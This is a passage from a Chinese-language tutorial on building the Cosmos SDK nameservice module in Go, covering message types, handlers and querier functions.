<p>需要修改<code>./x/cosmosnameservice/types/MsgSetName.go</code></p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> types</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	sdk <span class="string">&quot;github.com/cosmos/cosmos-sdk/types&quot;</span></span><br><span class="line">	sdkerrors <span class="string">&quot;github.com/cosmos/cosmos-sdk/types/errors&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// MsgSetName defines a SetName message</span></span><br><span class="line"><span class="comment">// 定义MsgSetName的结构</span></span><br><span class="line"><span class="keyword">type</span> MsgSetName <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name  <span class="type">string</span>         <span class="string">`json:&quot;name&quot;`</span>  <span class="comment">// 目标域名</span></span><br><span class="line">	Value <span class="type">string</span>         <span class="string">`json:&quot;value&quot;`</span> <span class="comment">// 对应的值/解析值</span></span><br><span class="line">	Owner sdk.AccAddress <span class="string">`json:&quot;owner&quot;`</span> <span class="comment">// 拥有者</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NewMsgSetName is a constructor function for MsgSetName</span></span><br><span class="line"><span class="comment">// MsgSetName构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewMsgSetName</span><span class="params">(name <span class="type">string</span>, value <span class="type">string</span>, owner sdk.AccAddress)</span></span> MsgSetName &#123;</span><br><span class="line">	<span class="keyword">return</span> MsgSetName&#123;</span><br><span class="line">		Name:  name,</span><br><span class="line">		Value: value,</span><br><span class="line">		Owner: owner,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>MsgSetName具有设置域名解析值所需的三个属性：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>name</code>: 所要设置的域名</p>
</li>
<li class="lvl-2">
<p><code>value</code>: 要设置的域名解析值</p>
</li>
<li class="lvl-2">
<p><code>owner</code>: 域名的所有者</p>
</li>
</ul>
<p>接下来，实现<code>Msg</code>接口：</p>
<h2 id="Route和Type接口">Route和Type接口:</h2>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Route should return the name of the module</span></span><br><span class="line"><span class="comment">// 返回路由消息的键， 这里就是模块名</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(msg MsgSetName)</span></span> Route() <span class="type">string</span> &#123; <span class="keyword">return</span> RouterKey &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Type should return the action</span></span><br><span class="line"><span class="comment">// 操作名</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(msg MsgSetName)</span></span> Type() <span class="type">string</span> &#123; <span class="keyword">return</span> <span class="string">&quot;set_name&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
<p>SDK使用上述函数将Msg路由至合适的模块进行处理。它们还为用于索引的数据库标签添加了可读性的名称。</p>
<h2 id="ValidateBasic接口">ValidateBasic接口:</h2>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ValidateBasic runs stateless checks on the message</span></span><br><span class="line"><span class="comment">// 基本参数检测</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(msg MsgSetName)</span></span> ValidateBasic() <span class="type">error</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> msg.Owner.Empty() &#123;</span><br><span class="line">		<span class="keyword">return</span> sdkerrors.Wrap(sdkerrors.ErrInvalidAddress, msg.Owner.String())</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(msg.Name) == <span class="number">0</span> || <span class="built_in">len</span>(msg.Value) == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> sdkerrors.Wrap(sdkerrors.ErrUnknownRequest, <span class="string">&quot;Name and/or Value cannot be empty&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>ValidateBasic</code>用于对<code>Msg</code>的<strong>有效性进行一些基本的无状态检查</strong>。<br />
在此情形下，请检查没有属性为空。<br />
请注意这里使用<code>sdk.Error</code>类型,SDK提供了一组应用开发人员经常遇到的错误类型。</p>
<h2 id="GetSignBytes接口">GetSignBytes接口:</h2>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GetSignBytes encodes the message for signing</span></span><br><span class="line"><span class="comment">// GetSignBytes对整个MsgSetName消息本身进行编码、排序以进行后续的签名</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(msg MsgSetName)</span></span> GetSignBytes() []<span class="type">byte</span> &#123;</span><br><span class="line">	<span class="comment">// MustMarshalJSON序列化msg为字节切片</span></span><br><span class="line">	<span class="comment">// MustSortJSON返回根据key排序的json</span></span><br><span class="line">	<span class="keyword">return</span> sdk.MustSortJSON(ModuleCdc.MustMarshalJSON(msg))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>GetSignBytes</code>定义了如何编码Msg以进行签名。<br />
在大多数情形下，要编码成排好序的JSON。不应修改输出。</p>
<h2 id="GetSigners接口">GetSigners接口:</h2>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GetSigners defines whose signature is required</span></span><br><span class="line"><span class="comment">// 定义该需要谁的签名</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(msg MsgSetName)</span></span> GetSigners() []sdk.AccAddress &#123;</span><br><span class="line">	<span class="keyword">return</span> []sdk.AccAddress&#123;msg.Owner&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>GetSigners</code>定义一个<code>Tx</code>上需要哪些人的签名才能使其有效。<br />
在这种情形下，MsgSetName要求域名所有者在尝试重置域名解析值时要对该交易签名。</p>
<h1>handlerMsgSetName:</h1>
<p>目前MsgSetName已经规定好了, 当接收到了消息后Handler负责定义接下来的行动.<br />
<code>NewHandler本质</code>上是一个<strong>子路由器</strong>，它将进入该模块的消息分配给适当的处理程序。<br />
目前，只有一个<code>Msg/Handler</code>.</p>
<blockquote>
<p>注意：SDK中handler的命名规范是<code>handlerMsg&#123;.Action&#125;</code></p>
<p>需要修改<code>x/cosmosnameservice/handlerMsgSetName.go</code></p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cosmosnameservice</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	sdk <span class="string">&quot;github.com/cosmos/cosmos-sdk/types&quot;</span></span><br><span class="line">	sdkerrors <span class="string">&quot;github.com/cosmos/cosmos-sdk/types/errors&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jerrychan807/cosmos-nameservice/x/cosmosnameservice/keeper&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jerrychan807/cosmos-nameservice/x/cosmosnameservice/types&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handle a message to set name</span></span><br><span class="line"><span class="comment">// 接受到msg， 进一步的处理，相当于controller层， 操作keeper层</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleMsgSetName</span><span class="params">(ctx sdk.Context, keeper keeper.Keeper, msg types.MsgSetName)</span></span> (*sdk.Result, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="comment">// 检查MsgSetName的提供者是否为想要设置域名的域名拥有者， 即验证身份</span></span><br><span class="line">	<span class="keyword">if</span> !msg.Owner.Equals(keeper.GetWhoisOwner(ctx, msg.Name)) &#123; <span class="comment">// Checks if the the msg sender is the same as the current owner</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, sdkerrors.Wrap(sdkerrors.ErrUnauthorized, <span class="string">&quot;Incorrect Owner&quot;</span>) <span class="comment">// If not, throw an error</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 如果是本人的话设置所规定的值</span></span><br><span class="line">	<span class="comment">// 调用keeper进行域名的解析值设定</span></span><br><span class="line">	keeper.SetName(ctx, msg.Name, msg.Value) <span class="comment">// If so, set the name to the value specified in the msg.</span></span><br><span class="line">	<span class="keyword">return</span> &amp;sdk.Result&#123;&#125;, <span class="literal">nil</span>                <span class="comment">// return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>handler.go</code>是各个<code>handlerxxxx.go</code>的<strong>总路由</strong>, 所以每一个对应的<code>msg</code>都需要在这里注册, 下面是修改完整的<code>handler.go</code>:</p>
<blockquote>
<p>需要修改<code>x/cosmosnameservice/handler.go</code></p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cosmosnameservice</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	sdk <span class="string">&quot;github.com/cosmos/cosmos-sdk/types&quot;</span></span><br><span class="line">	sdkerrors <span class="string">&quot;github.com/cosmos/cosmos-sdk/types/errors&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jerrychan807/cosmos-nameservice/x/cosmosnameservice/keeper&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jerrychan807/cosmos-nameservice/x/cosmosnameservice/types&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// NewHandler returns a handler for &quot;nameservice&quot; type messages.</span></span><br><span class="line"><span class="comment">// 返回一个操作nameservice各类消息的Handler对象</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewHandler</span><span class="params">(keeper keeper.Keeper)</span></span> sdk.Handler &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(ctx sdk.Context, msg sdk.Msg)</span></span> (*sdk.Result, <span class="type">error</span>) &#123;</span><br><span class="line">		<span class="comment">//.(type)获取接口实例实际的类型指针, 以此调用实例所有可调用的方法，包括接口方法及自有方法。</span></span><br><span class="line">		<span class="comment">//需要注意的是该写法必须与switch case联合使用，case中列出实现该接口的类型。</span></span><br><span class="line">		<span class="keyword">switch</span> msg := msg.(<span class="keyword">type</span>) &#123;</span><br><span class="line">		<span class="comment">// 添加操作类型</span></span><br><span class="line">		<span class="keyword">case</span> types.MsgSetName:</span><br><span class="line">			<span class="keyword">return</span> handleMsgSetName(ctx, keeper, msg)</span><br><span class="line">		<span class="keyword">case</span> types.MsgBuyName:</span><br><span class="line">			<span class="keyword">return</span> handleMsgBuyName(ctx, keeper, msg)</span><br><span class="line">		<span class="keyword">case</span> types.MsgDeleteName:</span><br><span class="line">			<span class="keyword">return</span> handleMsgDeleteName(ctx, keeper, msg)</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span>, sdkerrors.Wrap(sdkerrors.ErrUnknownRequest, fmt.Sprintf(<span class="string">&quot;Unrecognized nameservice Msg type: %v&quot;</span>, msg.Type()))</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>现在, 拥有者可以设置域名的解析了, 但是如果是一个域名不存在拥有者的情况呢?<br />
现在模块需要提供一个途径让用户去购买域名, 下面就定义<code>BuyName</code>的Msg</p>
</blockquote>
<h1>MsgBuyName:</h1>
<blockquote>
<p>需要修改<code>./x/cosmosnameservice/types/MsgBuyName.go</code></p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> types</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	sdk <span class="string">&quot;github.com/cosmos/cosmos-sdk/types&quot;</span></span><br><span class="line">	sdkerrors <span class="string">&quot;github.com/cosmos/cosmos-sdk/types/errors&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Originally, this file was named MsgCreateWhois, and has been modified using search-and-replace to our Msg needs.</span></span><br><span class="line"><span class="comment">// 根据MsgCreateWhois文件改写</span></span><br><span class="line"><span class="comment">// MsgBuyName defines the BuyName message</span></span><br><span class="line"><span class="keyword">type</span> MsgBuyName <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name  <span class="type">string</span>         <span class="string">`json:&quot;name&quot;`</span>  <span class="comment">// 想购买的域名</span></span><br><span class="line">	Bid   sdk.Coins      <span class="string">`json:&quot;bid&quot;`</span>   <span class="comment">// 出价</span></span><br><span class="line">	Buyer sdk.AccAddress <span class="string">`json:&quot;buyer&quot;`</span> <span class="comment">// 购买者</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NewMsgBuyName is the constructor function for MsgBuyName</span></span><br><span class="line"><span class="comment">// MsgBuyName构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewMsgBuyName</span><span class="params">(name <span class="type">string</span>, bid sdk.Coins, buyer sdk.AccAddress)</span></span> MsgBuyName &#123;</span><br><span class="line">	<span class="keyword">return</span> MsgBuyName&#123;</span><br><span class="line">		Name:  name,</span><br><span class="line">		Bid:   bid,</span><br><span class="line">		Buyer: buyer,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Route should return the name of the module</span></span><br><span class="line"><span class="comment">// 路由返回模块名nameService</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(msg MsgBuyName)</span></span> Route() <span class="type">string</span> &#123; <span class="keyword">return</span> RouterKey &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Type should return the action</span></span><br><span class="line"><span class="comment">// 操作类型</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(msg MsgBuyName)</span></span> Type() <span class="type">string</span> &#123; <span class="keyword">return</span> <span class="string">&quot;buy_name&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ValidateBasic runs stateless checks on the message</span></span><br><span class="line"><span class="comment">// 基本的检查</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(msg MsgBuyName)</span></span> ValidateBasic() <span class="type">error</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> msg.Buyer.Empty() &#123;</span><br><span class="line">		<span class="keyword">return</span> sdkerrors.Wrap(sdkerrors.ErrInvalidAddress, msg.Buyer.String())</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(msg.Name) == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> sdkerrors.Wrap(sdkerrors.ErrUnknownRequest, <span class="string">&quot;Name cannot be empty&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> !msg.Bid.IsAllPositive() &#123;</span><br><span class="line">		<span class="keyword">return</span> sdkerrors.ErrInsufficientFunds</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetSignBytes encodes the message for signing</span></span><br><span class="line"><span class="comment">// 返回消息的编码后格式[]byte</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(msg MsgBuyName)</span></span> GetSignBytes() []<span class="type">byte</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> sdk.MustSortJSON(ModuleCdc.MustMarshalJSON(msg))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetSigners defines whose signature is required</span></span><br><span class="line"><span class="comment">// 要求签名的对象</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(msg MsgBuyName)</span></span> GetSigners() []sdk.AccAddress &#123;</span><br><span class="line">	<span class="keyword">return</span> []sdk.AccAddress&#123;msg.Buyer&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>handlerMsgBuyName:</h1>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cosmosnameservice</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	sdkerrors <span class="string">&quot;github.com/cosmos/cosmos-sdk/types/errors&quot;</span></span><br><span class="line"></span><br><span class="line">	sdk <span class="string">&quot;github.com/cosmos/cosmos-sdk/types&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jerrychan807/cosmos-nameservice/x/cosmosnameservice/keeper&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jerrychan807/cosmos-nameservice/x/cosmosnameservice/types&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handle a message to buy name</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleMsgBuyName</span><span class="params">(ctx sdk.Context, k keeper.Keeper, msg types.MsgBuyName)</span></span> (*sdk.Result, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="comment">// Checks if the the bid price is greater than the price paid by the current owner</span></span><br><span class="line">	<span class="comment">// 1.检查当前出价是否高于目前的价格, 注意Msg本身的检查只是简单的检查，这里需要额外数据的检查就只能在Handler中做</span></span><br><span class="line">	<span class="comment">// GetPrice返回coin类型对象，其IsAllGT函数是比较大小（逐个字母比较，全部大于返回true）</span></span><br><span class="line">	<span class="comment">// 当需要的价格 &gt; bid那么就返回错误</span></span><br><span class="line">	<span class="keyword">if</span> k.GetPrice(ctx, msg.Name).IsAllGT(msg.Bid) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, sdkerrors.Wrap(sdkerrors.ErrInsufficientFunds, <span class="string">&quot;Bid not high enough&quot;</span>) <span class="comment">// If not, throw an error</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 2.检查当前域名是否已经有拥有者了</span></span><br><span class="line">	<span class="comment">// 不论是已拥有或者没有人拥有， 如果购买者支付出价出现错误，那么都会造成资金的回滚</span></span><br><span class="line">	<span class="keyword">if</span> k.HasCreator(ctx, msg.Name) &#123;</span><br><span class="line">		<span class="comment">// 如果已经是别人拥有的，那么购买者支付对应的出价给域名原来的拥有者</span></span><br><span class="line">		<span class="comment">// coin转移方向： msg.Buyer =&gt; Creator</span></span><br><span class="line">		<span class="comment">// 金额： Bid</span></span><br><span class="line">		err := k.CoinKeeper.SendCoins(ctx, msg.Buyer, k.GetCreator(ctx, msg.Name), msg.Bid)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// 如果没有，那么从购买者处减去出价金额, 发送给一个不可回收的地址（burns）</span></span><br><span class="line">		_, err := k.CoinKeeper.SubtractCoins(ctx, msg.Buyer, msg.Bid) <span class="comment">// If so, deduct the Bid amount from the sender</span></span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 分别为域名设置新的所有者与金额</span></span><br><span class="line">	k.SetCreator(ctx, msg.Name, msg.Buyer)</span><br><span class="line">	k.SetPrice(ctx, msg.Name, msg.Bid)</span><br><span class="line">	<span class="keyword">return</span> &amp;sdk.Result&#123;&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同上,继续编写类似的<code>MsgDeleteName</code>和<code>handlerMsgDeleteName</code>。</p>
<blockquote>
<p>现在已经有了<code>Msgs</code>和<code>Handlers</code>定义，是时候学习如何使交易中的数据能被查询到！</p>
</blockquote>
<h1>Querier:</h1>
<p>首先创建<code>./x/cosmosnameservice/keeper/querier.go</code>文件。在这里定义应用程序用户可以对那些状态进行查询。<br />
你的<code>nameservice</code>模块会暴露3个<code>querier</code>:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>resolve</code>: 解析值</p>
</li>
<li class="lvl-2">
<p><code>getWhois</code>: 查询域名的所有相关信息</p>
</li>
<li class="lvl-2">
<p><code>listWhois</code>: 查询所有的已存在域名</p>
</li>
</ul>
<p>首先定义<code>NewQuerier</code>函数，该函数充当查询此模块的子路由器（类似于<code>NewHandler</code>函数）。<br />
请注意，因为querier没有类似于Msg的接口，所以需要手动定义switch语句（它们无法从<code>query.Route()</code>函数中删除）：</p>
<blockquote>
<p>需要修改<code>x/cosmosnameservice/keeper/querier.go</code></p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> keeper</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/jerrychan807/cosmos-nameservice/x/cosmosnameservice/types&quot;</span></span><br><span class="line">	<span class="comment">// this line is used by starport scaffolding # 1</span></span><br><span class="line">	abci <span class="string">&quot;github.com/tendermint/tendermint/abci/types&quot;</span></span><br><span class="line"></span><br><span class="line">	sdk <span class="string">&quot;github.com/cosmos/cosmos-sdk/types&quot;</span></span><br><span class="line">	sdkerrors <span class="string">&quot;github.com/cosmos/cosmos-sdk/types/errors&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// NewQuerier creates a new querier for nameservice clients.</span></span><br><span class="line"><span class="comment">// 创建了一个keeper层的查询对象给客户端</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewQuerier</span><span class="params">(k Keeper)</span></span> sdk.Querier &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(ctx sdk.Context, path []<span class="type">string</span>, req abci.RequestQuery)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">		<span class="keyword">switch</span> path[<span class="number">0</span>] &#123; <span class="comment">// 根据客户端输入的路径的第一个变量，确定查询的类型</span></span><br><span class="line">		<span class="comment">// this line is used by starport scaffolding # 2</span></span><br><span class="line">		<span class="comment">// 客户端输入的内容在types/querier.go中定义了常量作为路由</span></span><br><span class="line">		<span class="keyword">case</span> types.QueryResolveName:</span><br><span class="line">			<span class="keyword">return</span> resolveName(ctx, path[<span class="number">1</span>:], k)</span><br><span class="line">		<span class="keyword">case</span> types.QueryListWhois:</span><br><span class="line">			<span class="keyword">return</span> listWhois(ctx, k)</span><br><span class="line">		<span class="keyword">case</span> types.QueryGetWhois:</span><br><span class="line">			<span class="keyword">return</span> getWhois(ctx, path[<span class="number">1</span>:], k)</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span>, sdkerrors.Wrap(sdkerrors.ErrUnknownRequest, <span class="string">&quot;unknown nameservice query endpoint&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>现在已定义路由器，为每个查询定义输入和响应：</p>
<blockquote>
<p>需要修改<code>x/cosmosnameservice/types/whois.go</code></p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Functions used by querier  为用户查询的函数</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询whois的集合</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">listWhois</span><span class="params">(ctx sdk.Context, k Keeper)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> whoisList []types.Whois</span><br><span class="line">	store := ctx.KVStore(k.storeKey)</span><br><span class="line">	<span class="comment">// 根据前缀创建循环迭代器, 遍历所有包含此前缀字段的key对应的value</span></span><br><span class="line">	<span class="comment">// KVStorePrefixIterator 按升序迭代所有带有特定前缀的键</span></span><br><span class="line">	iterator := sdk.KVStorePrefixIterator(store, []<span class="type">byte</span>(types.WhoisPrefix))</span><br><span class="line">	<span class="comment">// 遍历</span></span><br><span class="line">	<span class="keyword">for</span> ; iterator.Valid(); iterator.Next() &#123;</span><br><span class="line">		<span class="keyword">var</span> whois types.Whois</span><br><span class="line">		<span class="comment">// 1. 迭代器获取包含特定前缀的完整key</span></span><br><span class="line">		<span class="comment">// 2. 获取whois（[]byte）进行解码</span></span><br><span class="line">		<span class="comment">// 3. 赋值给whois</span></span><br><span class="line">		k.cdc.MustUnmarshalBinaryLengthPrefixed(store.Get(iterator.Key()), &amp;whois)</span><br><span class="line">		<span class="comment">// 添加到集合中</span></span><br><span class="line">		whoisList = <span class="built_in">append</span>(whoisList, whois)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 再将整个list解码/序列化成字节数组，</span></span><br><span class="line">	<span class="comment">// MustMarshalJSONIndent有Must代表不返回其错误直接Panic处理， 即使有err的话，没有的话返回可能的错误</span></span><br><span class="line">	res := codec.MustMarshalJSONIndent(k.cdc, whoisList)</span><br><span class="line">	<span class="keyword">return</span> res, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Resolves a name, returns the value</span></span><br><span class="line"><span class="comment">// 解析域名对应的值,也就是whois中的字段value</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">resolveName</span><span class="params">(ctx sdk.Context, path []<span class="type">string</span>, keeper Keeper)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="comment">// 直接调用keeper的解析函数(见下方), key是path[0]</span></span><br><span class="line">	value := keeper.ResolveName(ctx, path[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> value == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> []<span class="type">byte</span>&#123;&#125;, sdkerrors.Wrap(sdkerrors.ErrUnknownRequest, <span class="string">&quot;could not resolve name&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 编码/序列化为字节数组</span></span><br><span class="line">	<span class="comment">// QueryResResolve是types/querier文件下的函数, QueryResResolve就是解析值的一个结构体</span></span><br><span class="line">	<span class="comment">// 因为MarshalJSONIndent解析需要一个结构体， 所以创建了这样的QueryResResolve结构体以赋值</span></span><br><span class="line">	res, err := codec.MarshalJSONIndent(keeper.cdc, types.QueryResResolve&#123;Value: value&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, sdkerrors.Wrap(sdkerrors.ErrJSONMarshal, err.Error())</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询单个Whois</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getWhois</span><span class="params">(ctx sdk.Context, path []<span class="type">string</span>, k Keeper)</span></span> (res []<span class="type">byte</span>, sdkError <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="comment">// 获取key, path的第一个参数(用户命令行输入)</span></span><br><span class="line">	key := path[<span class="number">0</span>]</span><br><span class="line">	<span class="comment">// 调用keeper的基本方法GetWhois(见上方)</span></span><br><span class="line">	whois, err := k.GetWhois(ctx, key)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 编码/序列化为字节数组</span></span><br><span class="line">	res, err = codec.MarshalJSONIndent(k.cdc, whois)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, sdkerrors.Wrap(sdkerrors.ErrJSONMarshal, err.Error())</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里，你的<code>Keeper</code>的<code>getter</code>和<code>setter</code>被大量使用。<br />
当构建任何其他使用此模块的应用程序时，您可能需要返回并定义更多的<code>getter/setter</code>来访问您需要的状态片段。<br />
按照约定，每个输出类型都应该是<code>JSON marshallable</code>和<code>stringable</code>(实现了Golang fmt接口)。返回的字节应该是输出结果的JSON编码。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>因此，对于<code>resolve</code>的输出类型，我们将解析字符串包装在一个名为<code>QueryResResolve</code>的结构中，该结构既是<code>JSON marshallable</code>的,又有<code>.string()</code>方法。</p>
</li>
<li class="lvl-2">
<p>对于<code>Whois</code>的输出，正常的Whois结构已经是<code>JSON marshallable</code>的，但是我们需要在其上添加一个<code>.string()</code>方法。</p>
</li>
<li class="lvl-2">
<p>对于<code>names</code>查询的输出也是一样的，[]字符串已经是本机可编组的，但是我们想在其上添加一个. string()方法。</p>
</li>
</ul>
<blockquote>
<p>既然你有办法改变和查看模块状态，那么现在是时候完成它了！ 接下来以<code>Amino编码格式</code>注册类型！</p>
</blockquote>
<h1>Codec文件:</h1>
<p>在<code>Amino</code>中注册你的数据类型使得它们能够<code>被编码/解码</code>。<br />
你创建的任何接口和实现接口的任何结构都需要在<code>RegisterCodec</code>函数中声明。<br />
在此模块中，需要注册三个Msg的实现（<code>SetName</code>, <code>BuyName</code> and <code>DeleteName</code>）。</p>
<blockquote>
<p>需要修改<code>x/cosmosnameservice/types/codec.go</code></p>
</blockquote>
